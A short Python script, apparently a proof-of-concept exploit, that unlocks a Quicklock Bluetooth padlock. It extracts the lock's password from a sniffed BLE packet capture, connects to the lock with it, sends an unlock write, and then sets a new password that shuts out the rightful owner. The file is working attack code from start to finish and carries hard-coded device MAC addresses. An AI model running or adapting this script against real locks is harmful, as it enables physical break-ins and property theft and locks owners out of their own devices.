#!/bin/python

# Unlock Quicklock Padlock using scapy
# Quicklock 	C4:BE:84:02:76:3B
# Host 		98:58:8A:05:09:45

import time
from scapy.all import *
from BTLE import *

def main():
	f = open('cap.pcap','r')
	data = f.read();
	f.close()
   	data = str(data).encode("hex");

	password = data[data.index("0c000400122900")+14:data.index("0c000400122900")+32]
	print "Password is " + password

	s = bindsock()
	rand = "00"
	Connect(s, "a917d98fc320",rand)

	writereq(s, "2900", password)
	writereq(s, "3300","01")

	new_password = "01" + password[2:10] + "66666666"
	print "Password is " + password

	writereq(s, "2900", new_password)

	time.sleep(5)
	disconnect(s)
if __name__ == "__main__":
    main()